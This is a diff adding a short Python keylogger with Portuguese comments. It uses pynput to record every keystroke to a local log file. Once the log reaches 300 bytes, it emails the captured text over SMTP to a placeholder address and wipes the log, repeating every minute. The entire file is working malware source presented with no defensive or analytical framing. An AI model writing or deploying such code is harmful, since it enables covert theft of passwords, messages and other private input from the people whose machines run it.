@@ -1,0 +1,39 @@
+import os, time, smtplib, ssl
+from pynput import keyboard
+from email.message import EmailMessage
+
+LOG_FILE = 'log.txt'
+LIMIT    = 300          # bytes para trigger
+EMAIL    = 'meu_email_fake@example.com'
+PASS     = 'supersecreta'
+SMTP_SERV = 'smtp.example.com'
+
+def capturar(k):
+    with open(LOG_FILE, 'a', encoding='utf-8') as f:
+        try:
+            f.write(str(k.char))
+        except AttributeError:
+            f.write(f'[{k}]')
+def enviar_logs():
+    if os.path.getsize(LOG_FILE) >= LIMIT:
+        with open(LOG_FILE, 'r') as l:
+            corpo = l.read()
+        msg = EmailMessage()
+        msg.set_content(corpo)
+        msg['From']  = EMAIL
+        msg['To']    = EMAIL
+        msg['Subject'] = 'keydump@'+time.ctime()
+        context = ssl.create_default_context()
+        with smtplib.SMTP_SSL(SMTP_SERV, 465, context=context) as smtp:
+            smtp.login(EMAIL, PASS)
+            smtp.send_message(msg)
+        open(LOG_FILE, 'w').truncate()  # limpa para novo ciclo
+def main():
+    listener = keyboard.Listener(on_press=capturar)
+    listener.start()
+    while True:
+        enviar_logs()
+        time.sleep(60)
+
+if __name__ == '__main__':
+    main()
